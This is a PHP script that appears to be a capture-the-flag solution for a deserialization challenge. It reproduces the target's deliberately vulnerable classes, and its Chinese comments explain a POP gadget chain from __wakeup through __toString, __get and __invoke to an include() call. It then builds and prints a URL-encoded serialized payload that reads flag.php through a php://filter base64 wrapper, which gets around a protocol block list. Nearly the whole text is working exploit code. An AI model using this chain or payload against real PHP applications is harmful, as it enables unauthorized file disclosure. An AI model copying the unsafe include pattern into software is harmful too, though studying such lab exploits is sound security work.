Welcome to index.php

<?php
class Modifier {
    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php';
    public function append($value){
        include($value);
    }
    public function __invoke(){
        //当对象作为函数时调用4
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){//类被当成字符串时2
        return $this->str->source;
    }

    public function __wakeup(){//反序列化之后调用1
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){//访问一个对象的不可访问或不存在属性时调用3
        $function = $this->p;
        return $function();
    }
}

//pop链
//Get传入反序列化pop
//反序列化->触发show函数中的__wakeup->过正则匹配 防止设置 $this->source = "index.php"
//source为类，触发__toString->return $this->str->source;
//str为Test，访问Test中的source访问不到，触发__get；
//$function = $this->p;  return $function();
//p设置为Modifier，触发__invoke->调用append($this->var)
//protected  $var;将var提供base64传入

$show=new Show();
$show->source=new Show();
$show->source->str=new Test();
$show->source->str->p=new Modifier();

print(urlencode(serialize($show)));

?>